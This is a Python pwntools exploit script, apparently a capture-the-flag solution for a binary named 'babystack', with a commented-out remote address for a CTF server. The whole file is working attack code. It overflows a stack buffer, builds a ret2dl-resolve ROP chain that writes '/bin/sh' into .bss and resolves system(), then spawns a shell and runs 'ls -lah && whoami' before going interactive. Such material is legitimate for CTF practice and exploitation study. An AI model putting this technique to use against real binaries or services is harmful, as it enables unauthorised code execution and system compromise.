#!/usr/bin/env python
#coding:utf-8
import sys
import roputils
from pwn import *

p = process("./babystack")
# p = remote("babystack.problem.cscctf.com", 11111)

pwn_file = ELF('./babystack')
offset = 20
readplt = pwn_file.plt['read']
#bss = 0x0804a040
vulFunc = pwn_file.symbols['vuln']

def getReloc(elf, base):
    jmprel = elf.dynamic('JMPREL')
    relent = elf.dynamic('RELENT')
    addr_reloc, padlen_reloc = elf.align(base, jmprel, relent)
    reloc_offset = addr_reloc - jmprel
    return reloc_offset

rop = roputils.ROP('./babystack')
addr_bss = rop.section('.bss')

# step1 : write sh & resolve struct to bss
buf1 = 'A' * offset 
buf1 += p32(readplt) + p32(vulFunc) + p32(0) + p32(addr_bss) + p32(100)
p.send(buf1)

buf2 =  rop.string('/bin/sh')
buf2 += rop.fill(20, buf2)
buf2 += rop.dl_resolve_data(addr_bss+20, 'system') 
buf2 += rop.fill(100, buf2)
p.send(buf2)

buf3 = 'A'*20 + rop.dl_resolve_call(addr_bss+20, addr_bss) 
p.send(buf3)
sleep(1)
p.sendline("ls -lah && whoami")

p.interactive()

'''
jmprel = ELF_obj.dynamic_value_by_tag("DT_JMPREL")#rel_plt
    relaent = ELF_obj.dynamic_value_by_tag("DT_RELAENT")
    symtab = ELF_obj.dynamic_value_by_tag("DT_SYMTAB")#dynsym
    syment = ELF_obj.dynamic_value_by_tag("DT_SYMENT")
    strtab = ELF_obj.dynamic_value_by_tag("DT_STRTAB")#dynstr
    versym = ELF_obj.dynamic_value_by_tag("DT_VERSYM")#version
    plt0 = ELF_obj.get_section_by_name('.plt').header.sh_addr
'''